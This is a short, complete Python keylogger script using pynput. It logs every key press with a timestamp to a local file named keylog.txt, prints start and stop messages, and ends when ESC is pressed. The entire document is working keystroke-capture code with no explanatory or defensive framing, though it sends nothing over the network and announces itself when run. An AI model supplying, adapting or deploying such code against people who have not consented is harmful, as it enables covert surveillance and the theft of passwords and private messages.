from pynput import keyboard
import logging
import datetime

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

def on_press(key):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        logging.info(f"[{timestamp}] {key.char}")
    except AttributeError:
        logging.info(f"[{timestamp}] {key}")

    if key == keyboard.Key.esc:
        print("Keylogger stopped by user.")
        return False

def on_release(key):
    pass

print("Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


